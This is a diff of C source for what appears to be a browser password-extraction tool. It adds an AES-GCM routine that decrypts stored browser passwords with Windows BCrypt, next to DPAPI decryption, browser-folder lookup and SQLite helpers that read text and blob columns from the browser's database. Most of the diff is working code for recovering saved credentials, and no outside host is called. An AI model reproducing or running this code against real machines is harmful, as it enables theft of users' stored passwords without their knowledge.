@@ -30,6 +30,46 @@ BOOL dpapi_decrypt(BYTE* encrypted_data, DWORD size_encrypted_data, DATA_BLOB* d
 	return TRUE;
 }
 
+BOOL aesgcm_decrypt(BCRYPT_KEY_HANDLE handle_bcrypt, DWORD offset, BYTE* encrypted_password, int* size_encrypted_datablob, BYTE* iv, DWORD size_iv, BYTE* tag, DWORD size_tag, BYTE** decrypted_byte, PULONG decrypted_byte_size) {
+	/* Set Additional info to the struct */
+	BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO aes_gcm_info;						// Struct to hold additional information required for decrypting (Nonce, Tag)
+	BCRYPT_INIT_AUTH_MODE_INFO(aes_gcm_info);
+	aes_gcm_info.pbNonce = iv;
+	aes_gcm_info.cbNonce = size_iv;
+	aes_gcm_info.pbTag = tag;
+	aes_gcm_info.cbTag = size_tag;
+
+	/* Get the buffer size required to hold the decrypted bytes to the 'size_required_decrypted_buffer' */
+	ULONG size_required_decrypted_buffer;									// To get the size required to hold decrypted bytes
+	NTSTATUS status;
+	status = BCryptDecrypt(handle_bcrypt, encrypted_password, *size_encrypted_datablob - (offset + size_iv + size_tag), &aes_gcm_info, NULL, 0, NULL, 0, &size_required_decrypted_buffer, 0);
+	if (!NT_SUCCESS(status)) {
+		return FALSE;
+	}
+
+	/* In case if the existing buffer size is not enough, Resize it to fit */
+	if (size_required_decrypted_buffer > *decrypted_byte_size) {
+		BYTE* tmp_byte;															// Temporary pointer, in case if the buffer to hold decrypted bytes is not enough
+		tmp_byte = (BYTE*)realloc(*decrypted_byte, size_required_decrypted_buffer);
+
+		if (!tmp_byte) {
+			return FALSE;
+		}
+		else {
+			*decrypted_byte = tmp_byte;
+			*decrypted_byte_size = size_required_decrypted_buffer;
+		}
+	}
+
+	/* Actual decryption process */
+	status = BCryptDecrypt(handle_bcrypt, encrypted_password, *size_encrypted_datablob - (offset + size_iv + size_tag), &aes_gcm_info, NULL, 0, *decrypted_byte, *decrypted_byte_size, &size_required_decrypted_buffer, 0);
+	if (!NT_SUCCESS(status)) {
+		return FALSE;
+	}
+
+	return TRUE;
+}
+
 // Gets the browser directory specified by the FOLDER_ID (look at win32 docs) and the relative path from that FOLDER_ID
 DWORD get_user_dir(GUID folder_id, PCWSTR browser_location, PWSTR buf_path, PSTR buf_outMsg, WORD buf_outSize) {
 	PWSTR p_temp_userdata_location = NULL;															// Temporary pointer to hold returned user data (%LOCALAPPDATA%, %APPDATA%, etc.) folder path
@@ -136,15 +176,25 @@ BOOL prepare_sql(void* handle_db, void** handle_sql_stmt, const char * sql_stmt,
 	return TRUE;
 }
 
-BOOL sql_result(sqlite3_stmt* handle_sql_stmt, char * result_1, int result_1_size, char * result_2, int result_2_size, char * result_3, int result_3_size) {
-	int status;
-	if ((status = sqlite3_step(handle_sql_stmt)) == SQLITE_ROW) {
-		memcpy(result_1, sqlite3_column_text(handle_sql_stmt, 0), result_1_size);
-		memcpy(result_2, sqlite3_column_text(handle_sql_stmt, 1), result_3_size);
-		memcpy(result_3, sqlite3_column_text(handle_sql_stmt, 2), result_2_size);
+// Iterate over results
+BOOL iterate_result(void* handle_sql_stmt) {
+	if ((sqlite3_step((sqlite3_stmt*)handle_sql_stmt)) == SQLITE_ROW)
 		return TRUE;
-	}
-	else {
+	else
 		return FALSE;
+}
+
+// Gets the result of the given index and the type
+void* get_result(void* handle_sql_stmt, int index, int type) {
+	if (type == TEXT_RESULT) {
+		return (void *)sqlite3_column_text((sqlite3_stmt*)handle_sql_stmt, index);
 	}
+	else if (type == BYTE_RESULT) {
+		return (void*)sqlite3_column_blob((sqlite3_stmt*)handle_sql_stmt, index);
+	}
+}
+
+// Gets the size of the result of the given index
+int get_result_size(void* handle_sql_stmt, int index) {
+	return sqlite3_column_bytes((sqlite3_stmt*)handle_sql_stmt, index);
 }
